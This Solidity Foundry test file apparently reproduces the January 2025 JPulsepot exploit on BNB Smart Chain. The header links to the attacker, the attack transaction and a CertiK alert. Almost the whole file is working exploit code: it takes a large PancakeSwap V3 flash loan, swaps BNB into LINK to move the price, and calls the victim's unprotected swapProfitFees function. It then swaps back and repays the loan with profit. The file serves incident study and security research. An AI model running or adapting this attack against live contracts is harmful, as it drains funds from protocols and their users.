// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : 21.5K
// Attacker : https://bscscan.com/address/0xf1e73123594cb0f3655d40e4dd6bde41fa8806e8
// Attack Contract : https://bscscan.com/address/0xe40ab156440804c3404bb80cbb6b47dddd3abfd7
// Vulnerable Contract : https://bscscan.com/address/0x384b9fb6e42dab87f3023d87ea1575499a69998e
// Attack Tx : https://bscscan.com/tx/0xd6ba15ecf3df9aaae37450df8f79233267af41535793ee1f69c565b50e28f7da

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x384b9fb6e42dab87f3023d87ea1575499a69998e#code

// @Analysis
// Post-mortem : 
// Twitter Guy : https://x.com/CertiKAlert/status/1877662352834793639
// Hacking God : 
pragma solidity ^0.8.0;

import "../interface.sol";

interface IFortuneWheel {
    function swapProfitFees() external;
}

contract JPulsepot is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 45_640_245;
    address internal constant PancakeV3Pool = 0x172fcD41E0913e95784454622d1c3724f546f849;
    address internal constant BNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant PancakeV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant LINK = 0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD;
    address internal constant victim = 0x384b9fb6E42dab87F3023D87ea1575499A69998E;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = address(BNB);
    }

    function testExploit() public balanceLog {
        //implement exploit code here
        address recipient = address(this);
        uint256 amount0 = 0;
        uint256 amount1 = 4_300_000_000_000_000_000_000;
        bytes memory data = abi.encode(amount1);
        IPancakeV3Pool(PancakeV3Pool).flash(recipient, amount0, amount1, data);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes memory data) external {
        uint256 amount = abi.decode(data, (uint256));

        IERC20(BNB).approve(PancakeV2Router, type(uint256).max);

        uint256 amountIn = amount;
        uint256 amonutOutMin = 0;
        address[] memory path = new address[](2);
        path[0] = BNB;
        path[1] = LINK;
        address recipient = address(this);
        uint256 deadline = block.timestamp;
        IUniswapV2Router(payable(PancakeV2Router)).swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, amonutOutMin, path, recipient, deadline);
        
        IFortuneWheel(victim).swapProfitFees();

        IERC20(LINK).approve(PancakeV2Router, type(uint256).max);

        amountIn = IERC20(LINK).balanceOf(address(this));
        path[0] = LINK;
        path[1] = BNB;
        IUniswapV2Router(payable(PancakeV2Router)).swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, 0, path, recipient, deadline);
        IERC20(BNB).transfer(msg.sender, amount+fee1);
    }

    receive() external payable {}
}
